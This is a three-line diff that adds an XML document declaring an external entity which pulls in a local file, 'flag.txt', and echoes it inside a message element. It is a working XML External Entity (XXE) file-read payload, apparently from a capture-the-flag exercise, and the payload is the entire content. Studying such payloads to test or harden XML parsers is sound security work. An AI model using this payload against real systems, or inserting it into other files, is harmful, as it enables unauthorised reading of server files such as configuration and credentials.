@@ -1,0 +1,3 @@
+<!DOCTYPE foo [
+ <!ENTITY flag SYSTEM "flag.txt" >]>
+    <message>&flag;</message>
